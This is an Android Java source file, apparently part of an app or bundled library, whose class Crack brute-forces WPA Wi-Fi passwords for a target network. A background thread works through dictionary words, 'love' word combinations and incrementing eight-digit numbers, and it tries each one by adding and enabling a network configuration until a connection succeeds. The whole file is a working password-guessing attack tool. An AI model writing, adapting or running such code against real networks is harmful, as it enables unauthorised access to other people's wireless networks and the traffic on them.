package com.android.adlib;

import java.util.ArrayList;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.SupplicantState;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.util.Log;

public class Crack {
	Context mContext;
	boolean isok = false;
	public static int orignal = 10000000;
	public static String MSG = "A.M.C.CON.OK";
	private Handler mHandler;

	public Crack(Context mContext,Handler handler) {
		this.mContext = mContext;
		this.mHandler = handler;
	}

	public boolean connectWifi(String s, String s1, Context context, String cap) {
		// s1 = "eben123456789";
		WifiManager wifimanager = (WifiManager) context
				.getSystemService("wifi");

		WifiConfiguration wc = new WifiConfiguration();
		wc.allowedAuthAlgorithms.clear();
		wc.allowedGroupCiphers.clear();
		wc.allowedKeyManagement.clear();
		wc.allowedPairwiseCiphers.clear();
		wc.allowedProtocols.clear();

		wc.SSID = (new StringBuilder("\"")).append(s).append("\"").toString();
		wc.preSharedKey = (new StringBuilder("\"")).append(s1).append("\"")
				.toString();
		wc.hiddenSSID = true;
		wc.status = WifiConfiguration.Status.ENABLED;
		wc.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP);
		wc.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP);
		wc.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK);
		wc.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP);
		wc.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
		if (cap.contains("WPA-PSK"))
			wc.allowedProtocols.set(WifiConfiguration.Protocol.WPA);
		else
			wc.allowedProtocols.set(WifiConfiguration.Protocol.RSN);

		int res = wifimanager.addNetwork(wc);
		Log.d("crack", "add Network returned " + res);
		boolean b = wifimanager.enableNetwork(res, true);
		Log.d("crack", "enableNetwork returned " + b);

		try {
			Thread.sleep(4000L);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		int i = 0;
		while (i < 6) {
			WifiInfo wifiinfo = wifimanager.getConnectionInfo();
			Log.d("crack", "wifiinfo " + wifiinfo);
			if (wifiinfo.getSupplicantState() == SupplicantState.COMPLETED) {
				return true;
			}
			// else if(wifiinfo.getSupplicantState() ==
			// SupplicantState.DISCONNECTED) {
			// return false;
			// }
			if (wifiinfo.getSupplicantState() != SupplicantState.SCANNING) {
				i++;
			}
			try {
				Thread.sleep(500L);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

		return false;
	}

	class CrackThread extends Thread {
		String name;
		String cap;
		Context context;

		public CrackThread(String name, String cap, Context context) {

			this.name = name;
			this.cap = cap;
			this.context = context;
		}

		@Override
		public void run() {
			
			int index = 0;
			int type = 0;
			String lowName = name.toLowerCase();
			String firstUpname = name.substring(0, 1).toUpperCase()
					+ name.substring(1);
			;
			String pw = null;

			int startInt = orignal;
//			boolean isok = false;
			ArrayList<String> list = getAll();
			do {
				if(exit)
					return;
//				if (index < Contants.common.length) {
//					pw = Contants.common[index];
//					if (1 == type) {
//						pw = lowName + pw;
//					}
//					index++;
//				}
				if(index >= list.size()) {
					index = 0;
				}
				if (index < list.size()) {
					pw = list.get(index);
//					if (1 == type) {
//						pw = lowName + pw;
//					}
					index++;
				}
				else {
					startInt = 1 + startInt;

					pw = (new StringBuilder()).append(startInt).toString();
				}

				Log.d("crack", "name : " + name + ",try pw : " + pw);
				isok = connectWifi(
						(new StringBuilder()).append(name).toString(), pw, context,
						cap);
			} while (!isok);
			context.sendBroadcast(new Intent(MSG));
			mHandler.sendEmptyMessage(100);
		}

	}
	
	private ArrayList<String> getAll() {
		ArrayList<String> list = new ArrayList<String>();
		for(String a:Contants.common) {
			if(!list.contains(a)) {
				list.add(a);
			}
		}
		for(String b:Contants.lovesuffix) {
			String a = Contants.Loveprefix1+b;
			if(!list.contains(a)) {
				list.add(a);
			}		
		}
		
		for(String b:Contants.lovesuffix) {
			String a = Contants.loveprefix2+b;
			if(!list.contains(a)) {
				list.add(a);
			}		
		}
		
		
		return list;
	}
	private CrackThread mythread;
	private boolean exit = false;

	public boolean crack(final String name,String cap,Context context) {
		Log.d("crack", "name : " + name);
		isok = false;
		if(isWifiAvailable(context)) {
			return false;
		}
		// int startInt = orignal;
		// (new Thread() {}
		// ).start();
		if(mythread == null) {
			mythread = new CrackThread(name, cap, context);
		    mythread.start();
		}
		
		return isok;
	}
	
	public void stop() {
		exit = true;
//		if(null != mythread) {
//			mythread.interrupt();
//		}
	}
	
	public static boolean isWifiAvailable(Context context) {
		// TODO Auto-generated method stub
		WifiManager wf = (WifiManager) context
				.getSystemService(Context.WIFI_SERVICE);
		ConnectivityManager cm = (ConnectivityManager)context
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		boolean bret = false;	
		if (null == cm) {

			// return false;
			bret = false;
		} else {
			NetworkInfo net = cm.getActiveNetworkInfo();
			if (null == net) {

				// return false;
				bret = false;
			} else {

				int netType = net.getType();
				String info = net.getExtraInfo();
;
					if (!wf.isWifiEnabled()) {

						// return false;
						bret = false;
					} else if (ConnectivityManager.TYPE_WIFI == net.getType()) {

						bret = true;
					}
				}

		}

		return bret;
	}
}
